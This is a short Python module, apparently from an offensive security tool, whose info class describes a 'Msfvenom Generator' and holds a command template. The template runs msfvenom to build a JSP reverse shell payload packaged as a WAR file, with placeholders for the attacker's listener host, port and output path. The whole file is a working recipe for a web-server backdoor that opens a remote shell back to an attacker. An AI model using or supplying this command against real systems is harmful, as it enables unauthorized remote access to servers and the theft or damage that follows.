class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Generate a reverse shell backdoor into a war file."
    function    = "Msfvenom Generator"
    liner       = 'msfvenom -p java/jsp_shell_reverse_tcp lhost="TARGET" lport=PORT -f war > FILE_PATH.war'
